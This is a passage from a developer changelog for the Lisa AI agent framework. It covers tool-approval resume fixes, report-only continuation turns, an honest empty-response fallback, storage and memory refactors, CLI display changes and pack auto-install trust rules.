  CORE_MAX_TOKENS, RETRIEVAL_MAX_TOKENS, MEMORY_MAX_TOKENS,
  REFLECTION_MAX_TOKENS, HISTORY_MAX_TOKENS, OPERATIONAL_MAX_TOKENS,
  TOKEN_CHAR_RATIO}` (optional; dataclass defaults unchanged). Removed env
  names (`LISA_IDENTITY_*` never existed; `WORKSPACE_ID_FALLBACK` was never
  read) — a hard cutover with no aliases, per the framework's no-compat
  rule. Every remaining kernel setting now carries a complete standalone
  definition (what it bounds, what failure mode motivated it, the interplay
  with the budgets it shares a pool with).
- **Tests:** `kernel/context/tests/test_evidence_freshness_regression.py`
  now pins importability *and* the migration (asserts the removed fields
  stay removed) instead of asserting the dead fields existed;
  `test_turn_runner_tool_dispatch.py` and
  `test_config_env_prefix.py` updated for the literal identity defaults and
  the corrected `stage_nudge_cap` baseline (9); allocator tests construct
  budgets explicitly.

### Fixed

#### Approval resume across a process restart (recorded-owner identity + decision diagnostics)

- **What:** Three fixes for the 2026-09-04 tumbleweed3 `bash_run` approval
  strand: the turn entered `default`, handed off to `shell` mid-turn, and the
  pending invocation's identity carried `mode_id="shell"`. Every CLI
  invocation is a fresh process, so `current_mode_id` reset to the start mode
  and the `/approve <id>` identity rebuild no longer matched the saved
  invocation — the approval stranded and every retry rendered one ambiguous
  "not pending" message. (1) `_handle_approval_command` now falls back to the
  **recorded owner identity** when the live rebuild diverges but the session
  scope (user, workspace, surface, memory scope) still agrees; cross-user
  references are still rejected. (2) The approve/deny failure replies
  distinguish the actual state — already approved/denied/executed, expired
  (latched by the service during the failed attempt via a re-fetch), or a
  different session — instead of one "not pending" string. (3)
  `_recovery_identity_for_invocation` and the paired-stall `settle` call were
  updated to the trimmed `RecoveryIdentity` / `RecoveryRecord` contracts
  (no `session_plan_digest` / `conversation_id` / `blocks_workflow` /
  `failure_scope`): the removed `blocks_workflow=False` kwarg raised
  `TypeError` inside the broad `except`, so paired stalls silently never
  settled and re-yielded on every subsequent turn. `_discover_active_router`
  also degrades to "no router" on a missing `models.yaml` instead of aborting
  hook construction for manifest-less hosts.
- **Why:** The exact-match approval identity is turn-scoped state
  (`current_mode_id`) that does not survive the process boundary the CLI
  model implies; the persisted invocation is the durable owner claim. The
  no-logs CLI host needs the failure reason in the operator reply itself.
- **Tests:** `runtime/tests/test_approval_commands.py` (approve after a
  process-restart mode reset matches the recorded owner; decision-state and
  expiry diagnostics; cross-user rejection; paired-stall settle asserts
  without the removed fields — 18 passed). The pre-existing
  `kernel/tests/test_turn_runner_approval_handoff.py` failure was a stale
  test seam, not a kernel regression: the transition gate reads the catalog
  through `kernel.ipsar_fsm.get_workflow_catalog`, so patching only the
  `kernel.turn_runner` re-export left the real `default`-only catalog in
  charge of `is_routable_mode` — the handoff fell through to "Unknown
  transition target" and minted the approval in the entry mode. The test now
  patches the ipsar_fsm bindings (per the kernel test-seams rule) and pins
  the owning-mode propagation.

#### Post-approval continuation: record the action, then synthesize

- **What:** Follow-up on the tumbleweed3 approval flow after the
  recorded-owner fix landed. `/approve <id>` now executed the action
  correctly (recovery records show `bash_run` → `root` succeeded), but the
  flow dead-ended there: the raw tool output was returned to the terminal
  with no thread record and no model synthesis. The paused turn's history
  ended at the approval request, so the next turn's context excerpt showed
  the announced action as never-run — the model re-planned from the stale
  prompt and re-issued the exact command it had already executed (`whoami`
  twice). `_handle_approval_command` now: (1) appends a thread entry for the
  executed action carrying its `EffectReceipt`
  (`capability_id` = target, `effect` from the invocation, provenance
  `source: "host-approved"` + the approval request id) so the completion
  contract counts the action and later turns read an honest history; and
  (2) routes a continuation turn in the invocation's owning mode with a
  query framing the output as observed data ("`bash_run` executed
  successfully and returned this output … Continue the task … Do not
  re-run the approved action"). The command dispatcher and the
  affirmative-resume path accept the structured `HostCommandResult` the
  continuation returns, preserving `operator_exit`.
- **Why:** An approval is a handoff back to the paused task, not a terminal
  answer. Returning raw output alone drops the task: the model never sees
  the result, the user must re-ask, and the re-issue loop defeats the
  exact-action contract the approvals exist to enforce.
- **Tests:** `runtime/tests/test_approval_commands.py` — 19 passed: the six
  approve-path tests converted to a stubbed continuation turn (asserting
  the continuation query carries the action output and the report-only
  instruction), plus a new test pinning the thread entry: one
  `host-approved` entry with the `bash_run`/`execute` receipt, the raw
  output as `response_text`, the approval id in provenance, and the owning
  mode stamped even after a restart-mode reset.

#### Continuation turn is report-only (single-approval UX)

- **What:** Follow-up on the first double-approval run after the
  continuation landed. The first `/approve` executed the action correctly,
  but the continuation prompt ("Continue the task … complete any remaining
  steps") invited the model to plan more tool work — it issued a genuinely
  new `bash_run` seconds later, minting a second approval the operator had
  to type by hand. That second pause was the exact-action contract working
  (a different command needs a different approval; receipts are
  single-use), but the UX friction came from the continuation's framing.
  The continuation query now instructs report-only: report the result in
  plain prose, do not call any tools, do not re-run the approved action,
  do not start follow-up commands — the operator is watching and can ask
  for more work explicitly. Any further effectful action still goes
  through the approval gate; it just no longer fires unprompted from the
  synthesis turn.
- **Why:** This host may be a one-shot CLI process: every new effectful
  action inside the continuation turn pauses the turn for another approval
  the operator must type by hand. The approval gate's job is to pause
  un-approved actions; the continuation turn's job is to report what the
  approved action produced.
- **Tests:** the continuation assertions in
  `runtime/tests/test_approval_commands.py` pin the report-only wording
  ("Do not call any tools", "do not start follow-up commands"); suite
  19 passed.

#### Budget-claim loop on empty completions (`thread_read_range` redaction + honest fallback)

- **What:** Two fixes for the 2026-08-30 remote-box relapse where Lisa claimed
  "I've hit my iteration budget" after 1-2 model calls on every turn:
  (1) the `lisa-thread` MCP server now resolves the same
  `LISA_THREAD_REDACTION_ENABLED` / `LISA_THREAD_REDACTION_PATTERNS` env
  contract as the host and applies the policy to every served entry
  (`thread_read_range` / `thread_read_recent` / `thread_search`) — the host
  exports both variables to the subprocess in `runtime.mcp_pool`;
  (2) the kernel's post-loop fallback in `kernel.turn_runner` no longer
  fabricates "I've hit my iteration budget" when the iteration cap never
  fired — an empty final completion now yields an honest "the model returned
  an empty response" question, and the budget claim is reserved for the case
  where `iteration >= max_tool_iterations` actually held. An empty-completion
  break now logs `finish_reason` so remote boxes can diagnose WHY the provider
  returned nothing (truncation vs unextracted reasoning) without local jsonls.
- **Why:** The exact "I've hit my iteration budget for this turn." string was
  harness-authored at any empty-content exit, persisted to the thread, and
  re-read by the model as ground truth — relabeling a provider-side empty
  response as a budget event and re-firing every turn. The 2026-08-27
  redaction facility covered the host's in-process excerpt/manifest/search
  reads but not the read-only MCP server the model calls for deep history
  (`thread_read_range` was observed in the failing trace immediately before
  each relapse), and redaction cannot prevent the next fabrication — the
  kernel authored each one fresh from empty content.
- **Config:** No new env vars — the server reuses
  `LISA_THREAD_REDACTION_ENABLED` / `LISA_THREAD_REDACTION_PATTERNS` (and
  `none`) with hard-cutover semantics identical to the host contract.

### Removed

#### Checkpoint system entirely

- **What:** The checkpoint subsystem has been removed entirely and replaced
  with thread-based `/resume`. Removed: `CheckpointBundle` and
  `CheckpointTuning` models, the `on_checkpoint` hook, auto-checkpoint
  Phase 3.6, the `sdk/packs/checkpoint/` pack (`lisa-pack-checkpoint`),
  the `save_checkpoint`/`restore_checkpoint`/`list_checkpoints` storage
  tools, the `write_turn_history` destructive compaction write-back, and
  the `/checkpoint`/`/restore`/`/checkpoints`/`/proceed`/`/summarize-history`
  commands.
- **Why:** The checkpoint layer duplicated durability that the append-only
  thread store already provides. One durable substrate (the thread) plus
  recovery records for in-flight dispatch items covers the same ground
  with less surface area and fewer drift bugs.
- **Migration:** `StorageBackend.__init__` now deletes any existing
  `artifacts/checkpoints/` directory (best-effort `shutil.rmtree`). The
  directory is not recreated.

### Added

#### Thread-based `/resume` command

- **What:** The recovery pack now ships a `/resume [reply]` command that
  scans the thread tail for the most recent `yielded=True` entry and
  surfaces its `yield_question`, optionally alongside stalled recovery
  records.
- **Why:** Replaces the `/proceed` command's resume-from-yield behavior
  with a thread-derived source of truth — no separate checkpoint bundle
  to rehydrate.

#### `yielded` and `yield_question` fields on thread entries

- **What:** `append_thread_entry` now stamps `yielded=True` and
  `yield_question` on the thread entry when a `YieldAction` fires.
- **Why:** Lets `/resume` reconstruct the paused question directly from
  the thread, without a sidecar checkpoint.

### Changed

#### Trimmed `RecoveryRecord`

- **What:** Removed `conversation_id`, `workflow_instance_id`,
  `blocks_workflow`, and `failure_scope` from `RecoveryRecord`; removed
  `session_plan_digest` from `RecoveryIdentity`; removed `"transition"`
  from `RecoveryTargetKind`.
- **Why:** These fields were populated only by the checkpoint layer or
  carried information now derivable from the thread/workflow view.

### Changed

#### Thread storage: segmented JSONL + zstd-sealed segments

- **What:** The per-user thread store is now a three-tier lossless layout:
  an append-only active segment (`<base>.current.jsonl`), zstd-compressed
  sealed segments (`<base>.<seg_id>.jsonl.zst`), and a sparse segment
  index (`<base>.index.jsonl`). See `docs/SPEC/THREAD_STORE.md` for the
  full format spec.
- **Why:** The legacy flat `thread.jsonl` had an O(file-size) tail read
  (`read_text().splitlines()[-limit:]`) that loaded the entire history
  into memory on every turn. The segmented store bounds the active
  segment to `segment_turns` (default 256), so recent-N reads are
  O(limit) in practice. Old turns are preserved losslessly in compressed
  sealed segments and retrievable by range via `load_thread_range`.
- **Migration:** A one-time rename guard in `append_thread_entry` moves
  a legacy `<base>.jsonl` to `<base>.current.jsonl` on first write. The
  old path is never read again (hard cutover, no compat shims). The old
  shared `thread_digest.md` sidecar is orphaned (not migrated); the new
  digest is per-user at `<base>.digest.md`.
- **Config:** New env `LISA_THREAD_SEGMENT_TURNS` (default 256) controls
  the seal threshold. `LISA_THREAD_MAX_ENTRIES` (default 50) remains the
  recent-N context window and now also bounds digest segments per slice.
- **Dependency:** Added `zstandard>=0.23.0` to `lisa-host-runtime`.

### Fixed

#### `memory.*` aliases no longer surface `user_slug` to the model

- **Root cause:** the generic `memory.add` / `memory.search` /
  `memory.list` / `memory.get` / `memory.delete` synthetic aliases
  declared `user_slug` as a settable parameter in their model-facing
  input schemas (`runtime/memory_aliases.py :: _memory_schemas`). The model
  has no source of truth for the active user slug, so it was forced to
  invent one — the "I need a user_slug to run memory.search" complaint.
  The native `lisa-memory` tools (`add_memory`, `search_memory`, …)
  carried the same field and had **no `proxy_policy.ambient`** entry in
  `sdk/packs/memory/mcp_servers.yaml`, so the proxy never stripped it
  from their schemas either.
- **Fix (two surfaces, same boundary):**
  1. `runtime/memory_aliases.py :: _memory_schemas` — drop `user_slug` from
     all five generic-alias schemas. `user_slug` is an ambient identity
     field, not a model-controllable parameter.
  2. `sdk/packs/memory/mcp_servers.yaml` — add a `proxy_policy.ambient`
     block (`user_slug: user_slug`) to the `lisa-memory` server so the
     proxy strips `user_slug` from the native tools' model-facing
     schemas and injects the runtime-resolved value at dispatch time
     (top-level, since lisa-memory has no `filters` parameter and
     `structured_filters` is left false).
- **Dispatch path (unchanged):** the ambient resolver registered by
  `runtime/memory_aliases.py :: register_memory_aliases`
  (`set_ambient_resolver("user_slug", lambda: user_slug)`) supplies the
  active user. The proxy's `_apply_proxy_policy_for_server` injects it
  into outgoing arguments on both the namespaced and server-scoped
  paths, overriding any model-supplied value as defense in depth. The
  `memory.search` operation path (`recall_memory`,
  `synthesize_and_store_learning`) already passes `user_slug` explicitly
  in `parameters`, so it is unaffected.

### Added

#### Unified child-turn classification with effect receipts

- **`EffectReceipt` model** (`kernel/models.py`) — frozen Pydantic model
  carrying the `effect` kind, `capability_id`, and optional `artifact_id`
  for one side-effecting capability that executed. Collected at dispatch
  time from the capability's declared `EffectKind`, not inferred from tool
  names or response prose. The child-turn completion contract checks
  receipts, so a child that called a `mode_allowlist`-admitted write
  operation (invisible to the old `authored_allowed_*`-only detector) is
  correctly counted as having completed.
- **`BlockDiagnostic` model** (`kernel/models.py`) — structured reason
  for a blocked child turn: `reason` (capability_gate / input_guard /
  output_guard), `resolved_model_id`, `missing_capabilities`, `message`.
  Carried on `ChildTurnOutcome` when `status` is `blocked` so the parent
  surfaces the actual cause (router declined to escalate) instead of the
  old misleading "model too weak to follow the sub-turn contract" framing.
- **`ChildTurnOutcome` model and `ChildStatus` Literal** (`kernel/models.py`)
  — the single canonical child-turn result: `status`, `output_text`,
  `error_message`, `duration_ms`, `tool_call_count`, `called_tool_names`,
  `effect_receipts`, `yield_action`, `block_diagnostic`. The fork and
  delegate adapters map this to their host-facing models
  (`ForkChildResult` / `DelegationResult`).
- **`mode_completion_effects` function** (`kernel/operations/registry.py`)
  — the single canonical resolver for a mode's required side-effecting
  capabilities. Reads authored bindings plus `mode_allowlist`-admitted
  operations and tools, excluding ambient `default_available` capabilities.
  Replaces the faulty `_fork_mode_action_tool_ids` which read only
  `authored_allowed_*` and missed `mode_allowlist`-admitted ops (the
  cross-pack pattern `markdown_forge_document` uses). The advertiser
  (`build_operation_tool_schemas`) and the validator now share one source
  of truth.
- **`classify_child_turn` function** (`kernel/turn_phases/_child_turn.py`)
  — the single shared classifier called by both the fork and delegate
  paths. Fixed classification order: `blocked` → `model_yield` →
  `interrupted` → `timeout`/`error`/`cancelled` → completion-contract →
  `complete`. Replaces 130+ lines of duplicated classification logic in
  `_run_fork_child_turn` and `_default_delegate_fn`.
- **`TurnResult.effect_receipts`** field — list of `EffectReceipt`s
  collected during the turn. Threaded through the turn loop, the sub-turn
  contract briefing, and the midpoint write-nudge (which is now
  receipt-aware).
- **`ForkChildStatus` and `DelegationStatus`** gain `"blocked"` (and
  `"max_depth"` on `ForkChildStatus` for union compatibility).

#### Memory backend CRUD completion

- **`get_memory` and `delete_memory` tools** added to the `lisa-memory` MCP
  server, completing the essential CRUD subset (add / search / list / get /
  delete). Both are surface-scoped: the caller's `user_slug` +
  `workspace_id` + `memory_scope` + `surface_id` filters are applied
  server-side, so cross-surface reads and deletes by id guessing are
  impossible.
- **`memory.get` and `memory.delete` synthetic aliases** registered on the
  generic memory router (`runtime/memory_aliases.py`), routing to the
  default backend's `get_memory` / `delete_memory` native tools. The alias
  contract grows from 3 to 5; backends that don't declare a `get` or
  `delete` tool name simply don't get those aliases registered (graceful
  partial-manifest handling).
- **`SqliteMemoryStore.get_memory` and `delete_memory`** methods, scoped by
  user + workspace + memory_scope + surface_id.
- **`dispute_memory` operation simplified**: the old list-50-and-filter
  client-side hack is replaced with a direct `memory.get(id)` call.

#### MCP server introspection in the CLI/REPL

- **`/mcp` REPL command and `lisa mcp` CLI subcommand now show a full
  per-server readout**: status (warm/cold/failed), transport (the
  `runtime_kind` from `mcp_servers.yaml` — `venv_bin`, `http`, `python`,
  …), URL or command, tool count, and last error. `/mcp <server_id>` (and
  `lisa mcp <server_id>`) drill into one server's tools with name,
  description, and required schema args. Cold servers are warmed on demand
  via `pool.list_tools(allowed_server_ids={server_id})` so their tools
  appear without a full pool warm-up.
- **`McpServerHealth` extended** with `transport`, `url`, `command`,
  `tool_count`, `tool_names`, `permanently_failed`, and `restart_count`
  fields. The introspection collector (`runtime/introspect.py`) now
  reads new pool accessors (`cold_failed_ids`, `permanently_failed_ids`,
  `restart_counts`, `last_errors`, `tools_by_server`) so a cold server
  that tried and failed reports `failed` (not `cold`), and the operator
  sees *why* it is down via `last_error`.
- **`MCPClientConfig.runtime_kind`** passthrough field (a string — the
  `RuntimeKind.value`) set by `compile_mcp_config` and the in-code
  `lisa-content`/`lisa-catalog` configs. Carried as a plain string so
  `kernel.tools` does not import from `kernel.mcp_launch` (preserving the
  `mcp_launch → tools` dependency direction).
- **`MCPToolPool` captures `_last_errors`** on every connect/restart
  failure (URL-stripped and length-bounded via `_safe_exc_desc`) and
  clears them on successful connect. Five new read accessors
  (`cold_failed_ids`, `permanently_failed_ids`, `restart_counts`,
  `last_errors`, `tools_by_server`) expose the pool's existing private
  bookkeeping without adding new mutation surface.
- **Hard cutover**: the lossy `McpToolEntry = tuple[str, str, bool]` type
  alias and the 2-column `render_mcp_tools` renderer are deleted.
  `_collect_mcp_tools` now returns `(dict[str, McpServerHealth],
  dict[str, list[MCPToolSpec]])` so the render layer stops discarding
  tool descriptions and schemas.

### Removed

#### Context: legacy `context_routing` / `ContextRoutingConfig` dead code

- **`ContextRoutingConfig` and `ContextRoutingNamespaceConfig` removed**
  from `kernel/models.py`. The legacy namespace-based context broker was
  replaced by the session-owned `ContextMapper` (driven by the `context`
  block → `ContextPlan`); these classes had no remaining readers. The
  `context_routing` field on `UnifiedState` and the matching
  `context_routing=` kwarg on `runtime/state_provider.build_unified_state`
  were also removed — neither call site in `turn_hooks_builder.py` passed
  it, so it was always `None`. Context admission and ordering policy now
  lives exclusively on the session plan's `context` block, passed to the
  mapper at turn time. `ContextItem.namespace` is retained as an
  author-facing provenance label but is documented as a non-selector.

#### Memory backend: redundant `get_memories` tool

- **`get_memories` tool removed** from the `lisa-memory` MCP server. It was
  a thin presentational wrapper over `list_memories` (same query, same
  params, newline-serialized instead of JSON) with no alias target, already
  denied from the model catalog. The standalone server now exposes five
  coherent tools (add / search / list / get / delete) instead of four where
  two were redundant.

#### Kernel config: obsolete memory-store settings removed

- **`kernel/config.py` no longer defines the memory-store settings** that
  the MCP-memory cutover obsoleted (`memory_sync_batch_size`,
  `memory_final_sync_timeout_seconds`, `memory_flush_interval_seconds`,
  `memory_snapshot_interval_seconds`, `memory_embedding_dimensions`,
  `memory_recall_candidate_pool_size`, `memory_recall_recent_limit`,
  `memory_recall_lexical_limit`, `memory_recall_semantic_limit`,
  `memory_recall_final_limit`, `memory_promotion_threshold`,
  `memory_eviction_min_age_days`, `memory_eviction_default_ttl_days`,
  `memory_eviction_min_access_count`,
  `memory_eviction_max_active_per_scope`). Their entries were also dropped
  from the `_coerce_numeric_with_inline_comments` field validator so
  `kernel.config.Settings` imports cleanly again (the dangling references
  had made the whole `kernel` package unimportable under Pydantic v2).
  The active recall/auto-capture knobs (`memory_recall_enabled`,
  `memory_recall_pre_turn_limit`, `memory_recall_min_query_chars`,
  `memory_auto_capture_enabled`, `memory_auto_capture_min_salience`) are
  unchanged.

### Changed

#### Evidence freshness: expiry based on `collected_at`, no TTL

- **`freshness_expires_at` on context evidence is now the raw
  `collected_at` string** instead of `_parse_iso(collected_at)`'s
  `datetime`/`None`, which contradicted the field's `str` type and would
  raise a Pydantic validation error at construction. The TTL-based freshness
  config is gone; expiry is anchored to when evidence was collected.

#### CLI host: flowing single-column transcript replaces the four-pane layout

- **The terminal turn display is now one flowing column of transcript rows** —
  no panes, headers, or boxes. Each stage event appends (or updates) one
  left-aligned line; tool calls are one-liners that update in place as they
  complete (`→ mcp read_file(path) ✓ 400ms`).
- **The final answer is re-rendered clean on completion.** The streamed
  answer is staged during generation but never shown as the final — on
  completion the Live region tears down and a fully formatted Markdown Panel
  renders the complete answer, so it reads cleanly instead of interspersed
  with the tool calls that produced it.
- **Thinking is interspersed, collapsible segments.** A reasoning model's
  thinking becomes multiple transcript rows that interleave with the tool
  calls in arrival order (a tool/model event closes the current segment so the
  next reasoning opens a fresh one). `Esc+t` expands/collapses ALL visible
  thinking segments together; each collapsed segment shows a compact
  `▸ Thinking… N char` summary.
- **Togglable call-stats summary.** After the answer, a summary line renders
  (call count with ✓/✗, total model time, handoff note). `--debug` upgrades it
  to a per-row trajectory table so the operator can audit the full turn.
- **Three-tier detail surface for live rows.** Default is a clean view (stage
  lines + tool one-liners with status glyphs). `Esc+d` toggles a power-user
  tier that adds the graphic column back (iteration/tool pip counters,
  duration sparklines, token-flow suffixes). `--debug` selects the full
  operator rendering at construction (every bookkeeping stage event + the
  debug-context panel), so the pane-era information density survives as
  opt-in telemetry, not the default surface.
- **Differentiators kept.** The live `[mode] → handoff` transition lines and
  the fork fan-out per-child table — telemetry no competitor shows — survive
  as flowing rows. The `▾ mode · model · tokens · ms` footer is unchanged.
- **Model calls are a single in-place-updated row.** `model_call` opens a
  model row and `model_call_complete` / `model_call_failed` update it in
  place with ✓/✗ + duration — the same pattern as
  `tool_dispatch` / `tool_dispatch_complete`. Previously each model
  iteration appended two rows (one for the start, one for the complete),
  doubling the row count and splitting the status from the call it
  describes. Now one iteration = one row:
  `[mode] stage: model_call haiku #1 ✓ 340ms`.
- The `TransportCallbacks` Protocol in `runtime/callbacks.py` is untouched;
  this is a CLI render-layer cutover only (hard cutover per the project
  contract — the pane machinery is deleted, not shimmed).

### Added

#### `default_available_tools` for MCP-native tools

- **MCP-native tools can now be ambient-available to every mode**, mirroring
  the `default_available: true` flag pack `.tool.yml` tools declare. MCP-native
  tools have no pack YAML front matter (they're discovered at runtime from
  server subprocesses and keyed namespaced as `server_id.tool`), so the flag
  lives on the host manifest instead: `default_available_tools:` on each
  server entry in `mcp_servers.yaml`.
- **The host resolves the namespaced ids** (`server_id.tool`, or
  `<pack_slug>.<server_id>.tool` for pack-contributed servers) and passes
  them to the `lisa-catalog` subprocess via the `LISA_DEFAULT_MCP_TOOLS` env
  var. The SDK catalog loader (`_merge_default_capabilities`) unions them
  into every mode's `allowed_tool_ids` with the same opt-out and idempotent
  semantics as pack `default_available: true` tools. The turn-runner's
  existing MCP-tool filter admits them with no further change.
- **`lisa-storage.read_file` is now ambient-available** by default, declared
  in `runtime/mcp_servers.yaml`. Modes can read persisted artifacts
  without re-listing the tool or paying the cold-server spawn cost unless
  they actually call it. The previous delegate pack tool under
  `sdk/packs/core/tools/read_file/` is removed — `lisa-storage` stays the
  sole storage owner.

### Changed

#### `FileWorkflowInstanceStore` moved from `kernel/` to `runtime/`

- **File-backed workflow-instance store relocated from the kernel to the host
  runtime.** `FileWorkflowInstanceStore` does file I/O, holds an
  `asyncio.Lock`, and writes under the host's `data_dir` — it is a
  host-runtime implementation, not a runtime-neutral contract. This mirrors
  the existing `recovery` split (`kernel/recovery.py` contracts vs
  `runtime/recovery.py` `FileRecoveryService`) and the `approvals` split.
- **Kernel keeps only the seam.** `kernel/workflow_instance_store.py` is
  trimmed to the `WorkflowInstanceStore` Protocol; its imports drop
  `asyncio`, `json`, `os`, `Path`, and `is_complete`.
- **Hard cutover, no compat.** The implementation now lives in
  `runtime/workflow_instance_store.py`. The single non-test importer
  (`runtime/runtime.py`) and the host wiring test import from the new
  location. The seven `FileWorkflowInstanceStore` tests moved from
  `kernel/tests/test_workflow_instance.py` to
  `runtime/tests/test_workflow_instance_store.py`; the kernel test file
  no longer imports a host implementation.

#### `kernel/introspect.py` moved to `runtime/introspect.py`

- **Live introspection gatherer relocated from the kernel to the host runtime.**
  `gather_introspection` reads host-owned concrete resources (the MCP tool
  pool, turn log path, token usage path), so it is a host-runtime
  implementation, not a runtime-neutral contract. The kernel only owns the
  `IntrospectSnapshot` / `McpServerHealth` / `TokenUsageSummary` /
  `LogErrorEntry` / `OperationalHealth` models and the `introspect_fn` seam
  on `OperationExecutionContext` and `TurnRunnerTurnConfig.introspect`.
- **Hard cutover, no compat.** `kernel/introspect.py` and
  `kernel/tests/test_introspect.py` are deleted. The single non-test
  importer (`runtime/turn_hooks_builder.py`) now imports
  `from runtime.introspect import gather_introspection`. The test moved
  to `runtime/tests/test_introspect.py`. `kernel/README.md`'s Built-in
  Capabilities table drops the `introspect.py` row; the `introspect` hook
  row (seam contract) stays.

### Removed

#### Model roles and `/deep` command

The `roles` mapping, the `deep` model role, and the `/deep` host command
have been removed entirely. The router (`lisa-router`) now owns per-iteration
model selection; `mode_models.default` is the single static baseline.

- `roles:` block removed from `models.yaml`; `mode_models.default` is the
  required baseline model.
- `/deep <query>` host command removed; the router's `rules` and `fallback`
  handle escalation patterns instead.
- `RouterRequest.roles_needed` field removed; CEL rules use
  `route.required_capabilities` for capability-based routing.
- `lisa.extensions.model_roles` entry-point group removed.
- `kernel/model_roles.py` deleted.
- `default_for_roles` field removed from `ManifestModelEntry`.
- Operations that fell back to `resolve_model_fn("deep")` now use
  `"default"`.

### Added

#### Session context auto-install of required packs

A session plan can now declare install sources for required packs via
`resources.packs.auto_install`. At host boot, any required pack that is not
yet importable is installed from its declared source before content-root
discovery runs.

- Auto-install applies **only** to `resources.packs.required` (never `include`).
- Git refs **must** pin `@tag/@branch/@sha` — mandatory for auto-install
  regardless of `LISA_PACK_REQUIRE_GIT_REF`.
- Trust policy env vars (`LISA_PACK_ALLOWED_PREFIXES`,
  `LISA_PACK_GIT_ALLOW_HOSTS`, `LISA_PACK_GIT_ROOT`) are honored; a session
  context cannot override them.
- Failure of any required pack is a hard startup error.
- When at least one pack is installed, the host requests a restart so
  entry-point discovery sees the new packs on the next boot pass.

#### Per-session model manifest path

A session plan can now point at a custom `models.yaml` via
`context.models.path`. The path is resolved relative to the session-context
file's directory or as an absolute path. When omitted, the host loads
`data_dir/models.yaml` as before.

### Changed

#### CLI status line reflects mid-turn transitions (not routing)

The initial thinking-spinner stage was renamed from `routing` to `dispatch`. The separate stateless router planner was removed in a hard cutover; routing is now an emergent property of the turn loop (mode handoff happens mid-turn via `transition_stage`), so `routing` was a misnomer for the pre-pipeline phase the spinner actually covers (command parse, `start_mode` bypass, `current_mode_id` selection).

Along with the rename, the CLI status line now surfaces turn detail that was already emitted by the kernel but not rendered:

- **Active mode prefix.** Every status line is prefixed with `[mode]`, tracked live from `model_call.mode_id` and updated when a mid-turn handoff lands (`tool_dispatch_complete` with `transition="handoff"`). A `default → coding` switch is now visible on the spinner line itself.
- **Legible tool dispatch.** `tool_dispatch` renders a glyph + kind word per `tool_kind` — `→ op:`, `→ tool:`, `→ mcp:`, and `↦ transition_stage →  <target>` (or `fork (N children)`) — instead of a flat `tool_kind=…` suffix key, so the user can distinguish in-process operations, MCP calls, and mid-turn handoffs/forks at a glance.
- **Per-child fork table through `fork_complete`.** The fork fan-out's per-child table now survives `fork_complete` so the user sees *which* children succeeded/failed (`#0 coding · implement · ok`, `#1 markdown · no_tools`), not just ok/failed counts. The table is cleared on the next `start_thinking`.
- **Turn-summary footer.** A one-line footer after the response renders `▾ mode · model · tokens · elapsed`, plus a `→  <new mode>` note when the model handed off mid-turn. Sourced from `runtime.last_turn_context` and the per-turn elapsed timer.
- **Distinct dispatch spinner.** The `dispatch` phase uses a `dots2` spinner (vs the normal `dots`) so the user can tell "still deciding where this goes" from "model is generating."

Affected: `hosts/cli/transport.py` (`start_thinking`, `on_stage`, `_render_status_line`, `_render_tool_dispatch`, `_render_fork_stage`), `hosts/cli/repl.py` (`_render_turn_footer`), tests in `hosts/cli/tests/test_transport_stage.py` and the new `hosts/cli/tests/test_repl_footer.py`.

### Added

#### Exportable and default-available capabilities

- **`exportable` and `default_available` flags on operation/tool YAML.** Two pack-authored visibility flags control cross-pack capability access. `exportable: true` (default `false`) marks a capability as referenceable by modes in other packs; a foreign mode referencing a non-exported capability is rejected at startup by `validate_export_boundaries` (`kernel/operations/registry.py`). `default_available: true` (default `false`) marks a capability for ambient merge: the SDK catalog loader (`sdk/content/_catalog.py :: _merge_default_capabilities`) auto-unions the id into every mode's effective `allowed_operation_ids` / `allowed_tool_ids` before the kernel sees them, so modes inherit ambient capabilities (e.g. `recall_memory`) without re-listing them. The merge is idempotent and happens entirely in the SDK layer; the kernel's `tools_authoritative` filter is unchanged.
- **Mode-level opt-out keys: `accept_default_capabilities`, `excluded_operation_ids`, `excluded_tool_ids`.** `accept_default_capabilities: false` (default `true`) disables all ambient inheritance for a mode. `excluded_operation_ids` / `excluded_tool_ids` subtract specific ambient ids while keeping the rest. Added to `WorkflowModeConfig` (`kernel/models.py`), the FSM loader protected-keys sets, the SDK loader, and the kernel deserializer.
- **`authored_allowed_operation_ids` / `authored_allowed_tool_ids` on `WorkflowModeConfig`.** Captures the explicit front-matter allowlists before the default-available merge, so `mode_completion_effects` (`kernel/operations/registry.py`) checks only the authored set plus `mode_allowlist`-admitted capabilities — a chat-only mode that inherits `recall_memory` is not misflagged as requiring tools to complete.
- **Seeds: `recall_memory` is `exportable: true, default_available: true`; `web_search` (tool + operation) is `exportable: true` only** (search is costly, stays opt-in per mode).

### Changed

#### `search`, `markdown`, `compaction`, `letta` moved out of `sdk/packs` to external `lisa_packs` submodules

- **Four packs migrated from bundled workspace members to external packs.** `lisa-pack-search`, `lisa-pack-markdown`, `lisa-pack-compaction`, and `lisa-pack-letta` moved out of `sdk/packs/<name>` (import `sdk.packs.<name>`) to `lisa_packs/<name>/` submodules (import `lisa_packs.<name>`), each in its own `github.com/Lisa-Framework/lisa-pack-<name>` repository pinned into `lisa-framework/packs`. Import paths renamed from `sdk.packs.<name>` to `lisa_packs.<name>`; distribution names unchanged. `compaction` keeps its `from sdk.packs.checkpoint...` import because `checkpoint` stays bundled. The bundled `sdk/packs` set is now `core`, `introspect`, `memory`, `models`, `checkpoint`.
- **All four are on-demand via `/pack install`.** Removed from the framework `pyproject.toml` `[project.dependencies]` and `[tool.uv.sources]`, and from every host `pyproject.toml`. A fresh `uv sync` no longer installs them; install the ones you want with `uv pip install -e ../lisa_packs/<name>` or the in-app `/pack install lisa-pack-<name>`.
- **`lisa-pack-search` removed from `host` hard deps.** The transport-neutral runtime no longer depends on a research-personality pack; `/search` and `/discuss` are a starter-subset choice wired by the transport hosts (and now on-demand there too).
- **Test conftest repointed.** `kernel/tests/conftest_catalog.py` and `runtime/tests/conftest.py` now discover migrated packs via the sibling `lisa_packs/<name>/lisa_packs/<name>` content roots when the submodules are checked out, and omit them when absent. `kernel/tests/test_compaction_seams.py` imports the compaction factory from `lisa_packs.compaction` with `pytest.importorskip` so it skips when the pack isn't installed.

#### `lisa-pack-models` moved back into the framework; `lisa_packs` split into per-pack submodule repos

- **`lisa-pack-models` (formerly `lisa-pack-model-picker`) is now a bundled framework pack at `sdk/packs/models`.** Import path renamed from `lisa_packs.model_picker` back to `sdk.packs.models`; distribution name renamed from `lisa-pack-model-picker` to `lisa-pack-models`. Consumed as a uv workspace member (`sdk/packs/models`) rather than a path dependency. The bundled pack is seeded enabled by default.
